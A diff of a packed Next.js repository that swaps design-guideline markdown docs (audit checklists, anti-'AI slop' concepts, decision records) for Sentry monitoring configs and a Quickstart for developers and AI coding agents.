+6: export default config;
 `````
 
-## File: .agents/workflows/graphify.md
-`````markdown
- 1: ---
- 2: name: graphify
- 3: description: Turn any folder of files into a navigable knowledge graph
- 4: ---
- 5: 
- 6: # Workflow: graphify
- 7: 
- 8: Follow the graphify skill installed at ~/.gemini/config/skills/graphify/SKILL.md to run the full pipeline.
- 9: 
-10: If no path argument is given, use `.` (current directory).
+## File: sentry.client.config.ts
+`````typescript
+ 1: import * as Sentry from "@sentry/nextjs";
+ 2: Sentry.init({
+ 3:   dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
+ 4:   tracesSampleRate: process.env.NODE_ENV === "production" ? 0.1 : 1.0,
+ 5:   debug: false,
+ 6:   replaysOnErrorSampleRate: 1.0,
+ 7:   replaysSessionSampleRate: process.env.NODE_ENV === "production" ? 0.1 : 1.0,
+ 8:   integrations: [
+ 9:     Sentry.replayIntegration({
+10:       maskAllText: true,
+11:       blockAllMedia: true,
+12:     }),
+13:   ],
+14: });
 `````
 
-## File: .husky/pre-commit
-`````
-1: #!/bin/dash
-2: pnpm exec lint-staged
-`````
-
-## File: docs/audits/Brand Fidelity Audit.md
-`````markdown
- 1: # Brand Fidelity Audit
- 2: 
- 3: Verify that redesigns preserve brand identity and URLs.
- 4: 
- 5: ---
- 6: 
- 7: # Rules
- 8: 
- 9: - Never change existing URLs without explicit decision.
-10: - Never change brand identity without explicit decision.
-11: - Document every change that affects brand or routing.
-12: - Record the before and after state.
-13: 
-14: ---
-15: 
-16: # What to Check
-17: 
-18: ## URLs
-19: 
-20: - [ ] All existing URLs preserved.
-21: - [ ] New URLs follow existing patterns.
-22: - [ ] Redirects in place for any changed URLs.
-23: 
-24: ## Brand Identity
-25: 
-26: - [ ] Logo and wordmark unchanged.
-27: - [ ] Brand colors preserved (unless explicitly updated).
-28: - [ ] Brand typography preserved (unless explicitly updated).
-29: - [ ] Brand voice and tone consistent.
-30: 
-31: ## Visual Identity
-32: 
-33: - [ ] Consistent visual language across pages.
-34: - [ ] No jarring style changes between sections.
-35: - [ ] Transition between old and new design is smooth.
-36: 
-37: ---
-38: 
-39: # Documentation
-40: 
-41: Record all changes:
-42: 
-43: - What changed.
-44: - Why it changed.
-45: - Who approved the change.
-46: - Impact on existing users.
-47: 
-48: ---
-49: 
-50: # Sources
-51: 
-52: - Gogh maturity gates - Brand preservation rules.
-53: - Taste Skill v2 - Redesign protocol.
+## File: sentry.edge.config.ts
+`````typescript
+1: import * as Sentry from "@sentry/nextjs";
+2: Sentry.init({
+3:   dsn: process.env.SENTRY_DSN ?? process.env.NEXT_PUBLIC_SENTRY_DSN,
+4:   tracesSampleRate: 1,
+5:   dataCollection: {
+6:   },
+7: });
 `````
 
-## File: docs/audits/Impeccable Audit and Detect.md
-`````markdown
- 1: # Impeccable Audit and Detect
- 2: 
- 3: Automated visual and engineering defect detection using Impeccable.
- 4: 
- 5: ---
- 6: 
- 7: # Installation
- 8: 
- 9: ```bash
-10: npx impeccable install
-11: ```
-12: 
-13: ---
-14: 
-15: # Running Detection
-16: 
-17: ```bash
-18: npx impeccable detect
-19: ```
-20: 
-21: This runs 45 deterministic rules without an LLM.
-22: 
-23: ---
-24: 
-25: # What It Detects
-26: 
-27: - Typography violations.
-28: - Color violations.
-29: - Layout violations.
-30: - Interaction violations.
-31: - Performance violations.
-32: - Accessibility violations.
-33: 
-34: ---
-35: 
-36: # Named Anti-Slop Tells
-37: 
-38: - Inter for everything without justification.
-39: - Purple-to-blue gradients.
-40: - Cards nested in cards.
-41: - Decorative grid backgrounds.
-42: - Two-axis gradient overlay patterns.
-43: 
-44: ---
-45: 
-46: # CI/CD Integration
-47: 
-48: Add to your CI pipeline:
-49: 
-50: ```bash
-51: npx impeccable detect --ci
-52: ```
-53: 
-54: Fails the build if any critical violations are found.
-55: 
-56: ---
-57: 
-58: # Manual Review
-59: 
-60: After automated detection:
-61: 
-62: 1. Review findings.
-63: 2. Fix critical violations first.
-64: 3. Address warnings based on priority.
-65: 4. Document any intentional deviations.
-66: 
-67: ---
-68: 
-69: # Sources
-70: 
-71: - pbakaus/impeccable (Apache-2.0).
-72: - impeccable.style.
-`````
-
-## File: docs/audits/MIFB Review Checklist.md
-`````markdown
- 1: # MIFB Review Checklist
- 2: 
- 3: Micro-interaction and visual polish review based on Make Interfaces Feel Better.
- 4: 
- 5: ---
- 6: 
- 7: # Shadow Review
- 8: 
- 9: - [ ] Shadows composed from three layers (ambient, key, rim).
-10: - [ ] Shadows used instead of borders for depth.
-11: - [ ] Shadow color adjusted for dark mode.
-12: - [ ] No single-layer box-shadow.
-13: 
-14: ---
-15: 
-16: # Border Radius Review
-17: 
-18: - [ ] Concentric radius formula applied: outer = inner + padding.
-19: - [ ] Consistent radius scale across the page.
-20: - [ ] No mixed radius scales.
-21: 
-22: ---
-23: 
-24: # Press State Review
-25: 
-26: - [ ] All buttons have press feedback.
-27: - [ ] Press feedback: `scale(0.96)`.
-28: - [ ] Never below `scale(0.95)`.
-29: - [ ] Hover states present on all interactive elements.
-30: 
-31: ---
-32: 
-33: # Hit Area Review
-34: 
-35: - [ ] All interactive elements: 40x40px minimum.
-36: - [ ] Smaller elements extended with pseudo-elements.
-37: - [ ] Touch targets meet mobile requirements.
-38: 
-39: ---
-40: 
-41: # Animation Review
-42: 
-43: - [ ] Icon animations: scale 0.25->1, opacity 0->1, blur 4px->0.
-44: - [ ] Stagger delay: ~100ms between items.
-45: - [ ] Enter duration: ~800ms.
-46: - [ ] Exit subtler than enter.
-47: - [ ] `prefers-reduced-motion` honored.
-48: - [ ] Spring settings: duration 0.3, bounce 0.
-49: 
-50: ---
-51: 
-52: # Typography Review
-53: 
-54: - [ ] Font smoothing: `-webkit-font-smoothing: antialiased`.
-55: - [ ] Tabular nums for numeric data.
-56: - [ ] Optical alignment applied.
-57: - [ ] Line length: 45-90 characters.
-58: 
-59: ---
-60: 
-61: # Image Review
-62: 
-63: - [ ] Image outlines: 1px at 10% opacity.
-64: - [ ] Black outline in light mode, white in dark mode.
-65: 
-66: ---
-67: 
-68: # Sources
-69: 
-70: - jakubkrehel/make-interfaces-feel-better.
-71: - jakub.kr/writing/details-that-make-interfaces-feel-better.
-`````
-
-## File: docs/audits/Pre-Flight Check (Section 14).md
-`````markdown
- 1: # Pre-Flight Check (Section 14)
- 2: 
- 3: Mandatory checklist before completing any page or component.
- 4: 
- 5: Every box must pass. Any failure blocks completion.
- 6: 
- 7: ---
- 8: 
- 9: # Design Dials
-10: 
-11: - [ ] Three dials set (Design Variance, Motion Intensity, Visual Density).
-12: - [ ] Dials committed before touching layout.
-13: 
-14: ---
-15: 
-16: # Color
-17: 
-18: - [ ] One accent color per page.
-19: - [ ] No purple-to-blue gradients.
-20: - [ ] No banned palettes (cream+terracotta, black+acid-green).
-21: - [ ] Design tokens from globals.css used consistently.
-22: - [ ] No hardcoded color values in Tailwind classes.
-23: 
-24: ---
-25: 
-26: # Typography
-27: 
-28: - [ ] Headlines use `text-wrap: balance`.
-29: - [ ] Body text uses `text-wrap: pretty`.
-30: - [ ] Body text: `max-w-[65ch]`.
-31: - [ ] Font smoothing enabled.
-32: - [ ] Tabular nums for numeric data.
-33: - [ ] No em-dashes or en-dashes in visible text.
-34: - [ ] Inter not used for everything without justification.
-35: 
-36: ---
-37: 
-38: # Hero
-39: 
-40: - [ ] Headline: max 2 lines.
-41: - [ ] Subtext: max 20 words.
-42: - [ ] CTA visible without scrolling.
-43: - [ ] Top padding: max `pt-24`.
-44: - [ ] Max 4 text elements.
-45: 
-46: ---
-47: 
-48: # Navigation
-49: 
-50: - [ ] Single line at desktop.
-51: - [ ] Height cap: 80px.
-52: - [ ] No hamburger on desktop.
-53: 
-54: ---
-55: 
-56: # Layout
-57: 
-58: - [ ] At least 4 layout families in 8-section pages.
-59: - [ ] Bento grids: exactly N cells for N items.
-60: - [ ] No cards nested inside cards.
-61: - [ ] Grid broken intentionally at least once.
-62: - [ ] Spacing feels deliberate, not uniform.
-63: 
-64: ---
-65: 
-66: # Interactions
-67: 
-68: - [ ] Interactive elements: 40x40px minimum hit area.
-69: - [ ] Press states: `scale(0.96)`.
-70: - [ ] Shadows: three-layer composition.
-71: - [ ] Borders avoided in favor of shadows.
-72: - [ ] Animations honor `prefers-reduced-motion`.
-73: - [ ] Icon animations: scale, opacity, blur with stagger.
-74: 
-75: ---
-76: 
-77: # Accessibility
-78: 
-79: - [ ] Focus rings visible on all interactive elements.
-80: - [ ] ARIA labels on icon-only buttons.
-81: - [ ] Semantic HTML elements.
-82: - [ ] Color contrast meets WCAG AA.
-83: - [ ] Keyboard navigation works.
-84: 
-85: ---
-86: 
-87: # Documentation Rules
-88: 
-89: Every significant change should update the relevant documentation.
-90: 
-91: Architecture decisions should be documented before implementation whenever possible.
-92: 
-93: Documentation should always reflect the current state of the project.
-`````
-
-## File: docs/audits/Preservation Audit.md
-`````markdown
- 1: # Preservation Audit
- 2: 
- 3: Ensure existing functionality is not broken during redesigns.
- 4: 
- 5: ---
- 6: 
- 7: # Rules
- 8: 
- 9: - Never destroy existing functionality without explicit decision.
-10: - Never break existing tests without explicit decision.
-11: - Never remove existing features without explicit decision.
-12: - Document every removal or change.
-13: 
-14: ---
-15: 
-16: # What to Check
-17: 
-18: ## Functionality
-19: 
-20: - [ ] All existing features still work.
-21: - [ ] No regression in existing behavior.
-22: - [ ] All existing tests still pass.
-23: 
-24: ## Data
-25: 
-26: - [ ] No data loss.
-27: - [ ] No schema changes without migration.
-28: - [ ] No breaking changes to API contracts.
-29: 
-30: ## Performance
-31: 
-32: - [ ] No performance regression.
-33: - [ ] Bundle size does not increase significantly.
-34: - [ ] No new client-side JavaScript without justification.
-35: 
-36: ## Accessibility
-37: 
-38: - [ ] No accessibility regression.
-39: - [ ] All existing ARIA attributes preserved.
-40: - [ ] Focus management unchanged or improved.
-41: 
-42: ---
-43: 
-44: # Documentation
-45: 
-46: Record all changes:
-47: 
-48: - What was preserved.
-49: - What was changed.
-50: - Why the change was necessary.
-51: - Impact assessment.
-52: 
-53: ---
-54: 
-55: # Sources
-56: 
-57: - Gogh maturity gates - Preservation rules.
-58: - Taste Skill v2 - Section 11 redesign protocol.
-`````
-
-## File: docs/audits/Vercel Audit Guidelines.md
-`````markdown
- 1: # Vercel Audit Guidelines
- 2: 
- 3: Performance and accessibility audit based on Vercel's web design guidelines.
- 4: 
- 5: ---
- 6: 
- 7: # Audit Process
- 8: 
- 9: 1. Read the target files.
-10: 2. Check all rules from `docs/rules/Vercel Interface Rule Categories.md`.
-11: 3. Output findings grouped by file in `file:line` format.
-12: 4. Mark each finding as pass/fail.
-13: 
-14: ---
-15: 
-16: # Accessibility Rules
-17: 
-18: - Icon-only buttons: `aria-label` present.
-19: - No `outline-none` without focus replacement.
-20: - No paste blocking on inputs.
-21: - `prefers-reduced-motion` honored.
-22: - Semantic HTML used.
-23: - Color contrast meets WCAG AA.
-24: 
-25: ---
-26: 
-27: # Performance Rules
-28: 
-29: - Server Components used by default.
-30: - Below-the-fold content lazy loaded.
-31: - Client JS minimized.
-32: - Streaming and Suspense used.
-33: - Critical navigation links prefetched.
-34: 
-35: ---
-36: 
-37: # Form Rules
-38: 
-39: - Labels associated with inputs.
-40: - Error messages linked via `aria-describedby`.
-41: - Required fields indicated.
-42: - Inline validation on blur.
-43: - No accidental state clearing.
-44: 
-45: ---
-46: 
-47: # Image Rules
-48: 
-49: - `width` and `height` on all images.
-50: - `next/image` used for optimization.
-51: - Alt text on meaningful images.
-52: - Decorative images: `alt=""`.
-53: 
-54: ---
-55: 
-56: # Output Format
-57: 
-58: ```
-59: file:line - PASS/FAIL - Description
-60: ```
-61: 
-62: Example:
-63: 
-64: ```
-65: app/page.tsx:42 - FAIL - Icon button missing aria-label
-66: components/ui/button.tsx:15 - PASS - Focus ring present
-67: ```
-68: 
-69: ---
-70: 
-71: # Sources
-72: 
-73: - vercel-labs/web-interface-guidelines (MIT).
-74: - vercel.com/design/guidelines.
-`````
-
-## File: docs/concepts/AI Slop.md
-`````markdown
- 1: # AI Slop
- 2: 
- 3: Understanding and preventing generic AI-generated UI output.
- 4: 
- 5: ---
- 6: 
- 7: # What Is AI Slop
- 8: 
- 9: AI slop is the distributional convergence of LLM-generated frontends. Because LLMs are statistical pattern matchers, they reach for the median of their training corpus.
-10: 
-11: The result: Inter for everything, purple-to-blue gradients, cards nested in cards, and minimal animations.
-12: 
-13: ---
-14: 
-15: # Why It Happens
-16: 
-17: - LLMs default to safe, common patterns.
-18: - Training data is dominated by tutorial and template outputs.
-19: - The median of training data is generic, not distinctive.
-20: - Without constraints, agents produce the same layouts.
-21: 
-22: ---
-23: 
-24: # The Fix
-25: 
-26: Constraint, not prompting.
-27: 
-28: - Forbidden patterns (anti-slop tells).
-29: - Committed aesthetic direction (three dials).
-30: - Pre-flight checks (Section 14).
-31: - Evidence-gated claims (source-ledger).
-32: 
-33: ---
-34: 
-35: # Named Tells
-36: 
-37: From Impeccable's 45-rule detector:
-38: 
-39: - Inter for everything.
-40: - Purple-to-blue gradients.
-41: - Cards nested in cards.
-42: - Decorative grid backgrounds.
-43: - Two-axis gradient overlays.
-44: - Uniform spacing everywhere.
-45: - No micro-interactions.
-46: - Generic hero sections.
-47: 
-48: ---
-49: 
-50: # Prevention Strategy
-51: 
-52: 1. Set the three dials before building.
-53: 2. Commit to a palette and direction.
-54: 3. Check against anti-slop tells.
-55: 4. Run pre-flight before shipping.
-56: 5. Document design decisions.
-57: 
-58: ---
-59: 
-60: # Sources
-61: 
-62: - Taste Skill v2 (Leon Lin) - Anti-slop framework.
-63: - Anthropic frontend-design - Distributional convergence research.
-64: - prg.sh - "Why Your AI Keeps Building the Same Purple Gradient Website."
-`````
-
-## File: docs/concepts/Coaxing Beats Constraint.md
-`````markdown
- 1: # Coaxing Beats Constraint
- 2: 
- 3: Why gentle guidance produces better design output than rigid rules.
- 4: 
- 5: ---
- 6: 
- 7: # The Problem
- 8: 
- 9: Rigid rules produce rigid output. When you tell an agent "use exactly 16px padding everywhere," you get uniform, lifeless layouts.
-10: 
-11: ---
-12: 
-13: # The Solution
-14: 
-15: Coaxing: setting direction and letting the agent fill in the details.
-16: 
-17: - Set the three dials (direction).
-18: - Define the palette (constraints).
-19: - Let the agent compose within those constraints.
-20: - Review and refine, not dictate.
-21: 
-22: ---
-23: 
-24: # How It Works
-25: 
-26: 1. Commit to a direction (three dials).
-27: 2. Define boundaries (palette, typography, radius).
-28: 3. Let the agent build within boundaries.
-29: 4. Critique and revise.
-30: 5. Never dictate every pixel.
-31: 
-32: ---
-33: 
-34: # When to Use Coaxing
-35: 
-36: - New features and components.
-37: - Landing pages and marketing sites.
-38: - Creative layouts and editorial designs.
-39: 
-40: ---
-41: 
-42: # When to Use Constraint
-43: 
-44: - Accessibility rules (non-negotiable).
-45: - Security rules (non-negotiable).
-46: - Architecture rules (non-negotiable).
-47: - Anti-slop tells (non-negotiable).
-48: 
-49: ---
-50: 
-51: # The Balance
-52: 
-53: - Coax for aesthetics.
-54: - Constrain for quality.
-55: - The three dials are coaxing tools.
-56: - The anti-slop tells are constraint tools.
-57: 
-58: ---
-59: 
-60: # Sources
-61: 
-62: - Taste Skill v2 (Leon Lin) - Coaxing vs constraint philosophy.
-`````
-
-## File: docs/concepts/Design Review as Infrastructure.md
-`````markdown
- 1: # Design Review as Infrastructure
- 2: 
- 3: Making design review a systematic, repeatable process rather than a one-time check.
- 4: 
- 5: ---
- 6: 
- 7: # The Problem
- 8: 
- 9: Design review is typically ad-hoc: someone looks at the UI and gives subjective feedback. This does not scale and is not repeatable.
-10: 
-11: ---
-12: 
-13: # The Solution
-14: 
-15: Treat design review as infrastructure:
-16: 
-17: - Automated checks (Impeccable detector, ESLint, TypeScript).
-18: - Manual checklists (Section 14 pre-flight).
-19: - Source-gated claims (every rule cites a source).
-20: - Repeatable pipelines (audit pipeline flow).
-21: 
-22: ---
-23: 
-24: # Layers of Review
-25: 
-26: ## Automated
-27: 
-28: - TypeScript type checking.
-29: - ESLint linting.
-30: - Impeccable 45-rule detector.
-31: - Knip dead code detection.
-32: 
-33: ## Semi-Automated
-34: 
-35: - Section 14 pre-flight checklist.
-36: - Vercel audit guidelines.
-37: - MIFB review checklist.
-38: 
-39: ## Manual
-40: 
-41: - Brand fidelity audit.
-42: - Preservation audit.
-43: - Accessibility testing.
-44: - Performance profiling.
-45: 
-46: ---
-47: 
-48: # Integration
-49: 
-50: Design review should be part of:
-51: 
-52: - Pre-commit hooks (Husky).
-53: - CI/CD pipeline (automated checks).
-54: - Pull request review (manual checks).
-55: - Release process (full audit).
-56: 
-57: ---
-58: 
-59: # Documentation
-60: 
-61: Every review finding should be:
-62: 
-63: - Documented in the relevant docs folder.
-64: - Tracked to resolution.
-65: - Linked to the source rule.
-66: 
-67: ---
-68: 
-69: # Sources
-70: 
-71: - Developers Digest - "Taste Skills Are Turning Agent Review Into Infrastructure."
-72: - Impeccable - Deterministic detector as infrastructure.
-`````
-
-## File: docs/concepts/Interruptible Animation.md
-`````markdown
- 1: # Interruptible Animation
- 2: 
- 3: Making animations that can be interrupted without breaking the interface.
- 4: 
- 5: ---
- 6: 
- 7: # The Problem
- 8: 
- 9: Non-interruptible animations frustrate users. When a user clicks a new target while an animation is running, the animation should stop cleanly and start the new one.
-10: 
-11: ---
-12: 
-13: # Rules
-14: 
-15: - All animations must be interruptible.
-16: - Use `transition` instead of `animation` when possible.
-17: - Prefer `transform` and `opacity` (GPU-accelerated).
-18: - Never animate layout properties (width, height, padding).
-19: 
-20: ---
-21: 
-22: # Implementation
-23: 
-24: ```tsx
-25: <div className="transition-all duration-300 ease-out">Content</div>
-26: ```
-27: 
-28: ---
-29: 
-30: # Animation Values
-31: 
-32: | Property        | Value              |
-33: | --------------- | ------------------ |
-34: | Enter duration  | ~800ms             |
-35: | Exit duration   | Subtler than enter |
-36: | Stagger delay   | ~100ms             |
-37: | Icon scale      | 0.25 -> 1          |
-38: | Icon opacity    | 0 -> 1             |
-39: | Icon blur       | 4px -> 0           |
-40: | Spring duration | 0.3                |
-41: | Spring bounce   | 0                  |
-42: 
-43: ---
-44: 
-45: # Reduced Motion
-46: 
-47: Always honor `prefers-reduced-motion`:
-48: 
-49: ```tsx
-50: @media (prefers-reduced-motion: reduce) {
-51:   * {
-52:     animation-duration: 0.01ms !important;
-53:     transition-duration: 0.01ms !important;
-54:   }
-55: }
-56: ```
-57: 
-58: ---
-59: 
-60: # Sources
-61: 
-62: - Make Interfaces Feel Better (Jakub Krehel) - Interruptible animations.
-63: - Vercel web-design-guidelines - Animation rules.
-`````
-
-## File: docs/concepts/Optical Alignment.md
-`````markdown
- 1: # Optical Alignment
- 2: 
- 3: Making interfaces feel visually correct, not just mathematically correct.
- 4: 
- 5: ---
- 6: 
- 7: # The Problem
- 8: 
- 9: Mathematical centering does not always look centered. Elements with different visual weights appear off-center when mathematically centered.
-10: 
-11: ---
-12: 
-13: # The Solution
-14: 
-15: Optical alignment adjusts elements based on their visual weight, not their mathematical position.
-16: 
-17: ---
-18: 
-19: # Rules
-20: 
-21: - Heavier elements shift slightly toward center.
-22: - Lighter elements shift slightly away from center.
-23: - Icons align with text baselines, not bounding boxes.
-24: - Circular elements align by visual center, not bounding box.
-25: 
-26: ---
-27: 
-28: # Examples
-29: 
-30: - A circle next to text: shift the circle down 1-2px to align optical center with text baseline.
-31: - An icon next to text: shift the icon down to align with the text's x-height.
-32: - A heavy headline above light body text: shift headline slightly down.
-33: 
-34: ---
-35: 
-36: # Application
-37: 
-38: - Check every composition for optical alignment.
-39: - Adjust padding and margin for visual balance.
-40: - Do not rely solely on Tailwind's default spacing.
-41: - Use arbitrary values when optical correction is needed.
-42: 
-43: ---
-44: 
-45: # Sources
-46: 
-47: - Make Interfaces Feel Better (Jakub Krehel) - Optical alignment rules.
-48: - Refactoring UI (Wathan & Schoger) - Visual hierarchy principles.
-`````
-
-## File: docs/decisions/Enforcement Layer Overlap.md
-`````markdown
- 1: # Enforcement Layer Overlap
- 2: 
- 3: Comparing enforcement approaches across Impeccable, Vercel, and Taste Skill.
- 4: 
- 5: ---
- 6: 
- 7: # Overlap Map
- 8: 
- 9: | Category        | Taste Skill             | Impeccable        | Vercel            |
-10: | --------------- | ----------------------- | ----------------- | ----------------- |
-11: | Anti-slop tells | Section 14              | 45-rule detector  | Audit findings    |
-12: | Typography      | Balance/pretty wrapping | Type scale rules  | Line length rules |
-13: | Color           | One accent, one palette | Color violations  | Contrast rules    |
-14: | Layout          | 4+ layout families      | Layout violations | Responsive rules  |
-15: | Interactions    | Hit areas, press states | Interaction rules | Touch targets     |
-16: | Accessibility   | Minimal                 | Minimal           | Comprehensive     |
-17: | Performance     | Minimal                 | Minimal           | Comprehensive     |
-18: 
-19: ---
-20: 
-21: # Resolution
-22: 
-23: When rules overlap:
-24: 
-25: 1. Project rules in `docs/rules/` take precedence.
-26: 2. Accessibility: Vercel guidelines are most comprehensive.
-27: 3. Aesthetic direction: Taste Skill is most comprehensive.
-28: 4. Anti-pattern detection: Impeccable is most comprehensive.
-29: 5. Micro-interactions: MIFB is most comprehensive.
-30: 
-31: ---
-32: 
-33: # Conflict Resolution
-34: 
-35: When skills conflict:
-36: 
-37: 1. Document the conflict.
-38: 2. Choose the rule that best fits the project.
-39: 3. Record the decision in `docs/decisions/`.
-40: 4. Apply consistently.
-41: 
-42: ---
-43: 
-44: # Sources
-45: 
-46: - Gogh - Enforcement layer overlap analysis.
-47: - Taste Skill v2, Impeccable, Vercel web-design-guidelines.
-`````
-
-## File: docs/decisions/Font Ban Conflicts.md
-`````markdown
- 1: # Font Ban Conflicts
- 2: 
- 3: Resolving conflicts between font-related rules across design skills.
- 4: 
- 5: ---
- 6: 
- 7: # The Conflict
- 8: 
- 9: Different skills have different opinions about font usage:
-10: 
-11: - Taste Skill: Bans Inter for everything without justification.
-12: - Impeccable: Flags Inter as an anti-slop tell.
-13: - Anthropic: Recommends committing to a type direction.
-14: - Vercel: Focuses on typography rules (balance, pretty, line length).
-15: 
-16: ---
-17: 
-18: # Resolution
-19: 
-20: - Inter is not banned outright, but using it for everything without justification is flagged.
-21: - Every project should commit to a type direction before building.
-22: - Use the project's chosen font consistently.
-23: - Apply typography rules (balance, pretty, line length) regardless of font choice.
-24: 
-25: ---
-26: 
-27: # Application
-28: 
-29: - Choose a font that fits the project's brand and audience.
-30: - Document the choice in `DESIGN.md` or equivalent.
-31: - Apply typography rules from all skills.
-32: - Do not switch fonts mid-project without explicit decision.
-33: 
-34: ---
-35: 
-36: # Sources
-37: 
-38: - Taste Skill v2 - Inter ban rule.
-39: - Impeccable - Named anti-slop tells.
-40: - Anthropic frontend-design - Typography direction.
-`````
-
-## File: docs/decisions/Motion Doctrine Conflicts.md
-`````markdown
- 1: # Motion Doctrine Conflicts
- 2: 
- 3: Resolving conflicts between animation and motion rules.
- 4: 
- 5: ---
- 6: 
- 7: # The Conflict
- 8: 
- 9: Different skills have different motion philosophies:
-10: 
-11: - Taste Skill: Motion Intensity dial (1-10).
-12: - MIFB: Specific animation values (duration, stagger, spring).
-13: - Impeccable: Minimal motion rules.
-14: - Vercel: Comprehensive animation rules (reduced motion, duration limits).
-15: 
-16: ---
-17: 
-18: # Resolution
-19: 
-20: - The Motion Intensity dial sets the overall animation level.
-21: - MIFB provides the specific values when animations are used.
-22: - Vercel rules for accessibility (reduced motion) are non-negotiable.
-23: - Impeccable flags excessive or broken animations.
-24: 
-25: ---
-26: 
-27: # Application
-28: 
-29: 1. Set the Motion Intensity dial before building.
-30: 2. Apply MIFB animation values for micro-interactions.
-31: 3. Always honor `prefers-reduced-motion`.
-32: 4. Keep animations under 300ms for micro-interactions.
-33: 5. Use `transform` and `opacity` for GPU-accelerated animations.
-34: 
-35: ---
-36: 
-37: # Sources
-38: 
-39: - Taste Skill v2 - Motion Intensity dial.
-40: - MIFB - Animation values.
-41: - Vercel web-design-guidelines - Animation rules.
-`````
-
-## File: docs/decisions/Prompt Layer vs Toolchain Layer.md
-`````markdown
- 1: # Prompt Layer vs Toolchain Layer
- 2: 
- 3: When to use prompt-based guidance vs persistent toolchain enforcement.
- 4: 
- 5: ---
- 6: 
- 7: # Prompt Layer
- 8: 
- 9: Prompt-based guidance is conversational:
-10: 
-11: - Three dials (set in conversation).
-12: - Aesthetic direction (committed verbally).
-13: - Hero thesis (defined in conversation).
-14: - Design rules (read from documentation).
-15: 
-16: ## When to Use
-17: 
-18: - Setting aesthetic direction.
-19: - Defining project-specific rules.
-20: - Creative decisions.
-21: - One-time setup.
-22: 
-23: ---
-24: 
-25: # Toolchain Layer
-26: 
-27: Toolchain enforcement is persistent:
-28: 
-29: - Impeccable detector (45 rules).
-30: - ESLint rules (automated).
-31: - TypeScript checks (automated).
-32: - Pre-commit hooks (automated).
-33: 
-34: ## When to Use
-35: 
-36: - Code quality enforcement.
-37: - Anti-pattern detection.
-38: - CI/CD checks.
-39: - Ongoing validation.
-40: 
-41: ---
-42: 
-43: # The Balance
-44: 
-45: - Use prompts for direction and creativity.
-46: - Use toolchain for enforcement and consistency.
-47: - Prompts set the rules; toolchain enforces them.
-48: - Neither is sufficient alone.
-49: 
-50: ---
-51: 
-52: # Application
-53: 
-54: 1. Use prompts to set the three dials and aesthetic direction.
-55: 2. Use toolchain to enforce anti-slop rules and code quality.
-56: 3. Document decisions in `docs/decisions/`.
-57: 4. Update toolchain rules when project rules change.
-58: 
-59: ---
-60: 
-61: # Sources
-62: 
-63: - Gogh - Prompt layer vs toolchain layer analysis.
-64: - Taste Skill v2, Impeccable, Vercel web-design-guidelines.
+## File: sentry.server.config.ts
+`````typescript
+1: import * as Sentry from "@sentry/nextjs";
+2: Sentry.init({
+3:   dsn: process.env.SENTRY_DSN ?? process.env.NEXT_PUBLIC_SENTRY_DSN,
+4:   tracesSampleRate: 1,
+5:   dataCollection: {
+6:   },
+7: });
 `````
 
 ## File: docs/deliverables/Design Skills Cheat Sheet.md
@@ -22958,6 +23907,59 @@ tsconfig.json
 92: - Make Interfaces Feel Better (Jakub Krehel).
 93: - Vercel web-design-guidelines.
 94: - Anthropic frontend-design.
+`````
+
+## File: docs/deliverables/Quickstart.md
+`````markdown
+ 1: # Quickstart
+ 2: 
+ 3: Get up and running with the design skill system.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # For Developers
+ 8: 
+ 9: 1. Read `docs/meta/Start Here.md`.
+10: 2. Read `docs/rules/Architecture and Stack.md`.
+11: 3. Read `docs/rules/AI Tells (Forbidden Patterns).md`.
+12: 4. Bookmark `docs/deliverables/Design Skills Cheat Sheet.md`.
+13: 
+14: ---
+15: 
+16: # For AI Agents (tool-agnostic)
+17: 
+18: 1. Read the project-level instructions file at the repository root:
+19:    - `AGENTS.md` (preferred, supported by most tools including Cursor, Claude Code, Aider, Codex CLI, and OpenCode).
+20:    - If your tool requires a different filename (e.g. `CLAUDE.md` for Claude Code, `.cursorrules` for Cursor, `.github/copilot-instructions.md` for Copilot), read whichever file your tool actually loads — they are kept in sync with `AGENTS.md`.
+21: 2. Read `docs/rules/Architecture and Stack.md`.
+22: 3. Read `docs/rules/AI Tells (Forbidden Patterns).md`.
+23: 4. Read `docs/skills/Taste Skill Project.md`.
+24: 5. Read `docs/meta/CONVENTIONS.md`.
+25: 
+26: ---
+27: 
+28: # Quick Reference
+29: 
+30: ## Before Building
+31: 
+32: - Set three dials.
+33: - Pick palette.
+34: - Define hero thesis.
+35: - Read existing patterns.
+36: 
+37: ## While Building
+38: 
+39: - Check anti-slop patterns.
+40: - Apply micro-interaction rules.
+41: - Follow typography rules.
+42: - Use design tokens.
+43: 
+44: ## Before Shipping
+45: 
+46: - Run pre-flight checklist.
+47: - Run audit pipeline.
+48: - Update documentation.
+49: - Verify accessibility.
 `````
 
 ## File: docs/deliverables/Unified Pre-Flight Mega Checklist.md
@@ -23206,259 +24208,82 @@ tsconfig.json
 90: Documentation should always reflect the current state of the project.
 `````
 
-## File: docs/flows/Build Greenfield (Prompt 1).md
+## File: docs/flows/Install and Load.md
 `````markdown
- 1: # Build Greenfield (Prompt 1)
+ 1: # Install and Load
  2: 
- 3: Workflow for building new components and features from scratch.
+ 3: How to install and load design skills in the project.
  4: 
  5: ---
  6: 
- 7: # Steps
+ 7: # Skill Installation
  8: 
- 9: ## 1. Set the Three Dials
+ 9: ## Taste Skill
 10: 
-11: Before writing any code, commit to:
-12: 
-13: - Design Variance (1-10, default 8).
-14: - Motion Intensity (1-10, default 6).
-15: - Visual Density (1-10, default 4).
-16: 
-17: ## 2. Define the Direction
-18: 
-19: - Pick a 4-6 value named hex palette.
-20: - Define the hero thesis (one sentence).
-21: - Identify the primary CTA.
-22: - Choose one justified aesthetic risk.
-23: 
-24: ## 3. Read Existing Patterns
-25: 
-26: - Check `components/ui/` for existing primitives.
-27: - Check `docs/rules/` for applicable rules.
-28: - Check `docs/skills/` for design skill references.
-29: 
-30: ## 4. Build the Component
-31: 
-32: - Start with Server Components.
-33: - Use shadcn/ui primitives where possible.
-34: - Apply Tailwind utilities consistently.
-35: - Use `cn()` for conditional classes.
-36: - Follow the layered architecture.
-37: 
-38: ## 5. Apply Design Rules
-39: 
-40: - Check against `docs/rules/AI Tells (Forbidden Patterns).md`.
-41: - Apply micro-interaction rules from `docs/skills/Make Interfaces Feel Better.md`.
-42: - Ensure typography follows `docs/rules/Anthropic Frontend Design Rules.md`.
-43: 
-44: ## 6. Run Pre-Flight
-45: 
-46: - Complete the Section 14 checklist.
-47: - Verify all checks pass.
-48: - If any check fails, revise and re-check.
-49: 
-50: ## 7. Document
-51: 
-52: - Update relevant documentation.
-53: - Add to component inventory if new.
-54: - Document any design decisions.
-55: 
-56: ---
-57: 
-58: # Architecture Flow
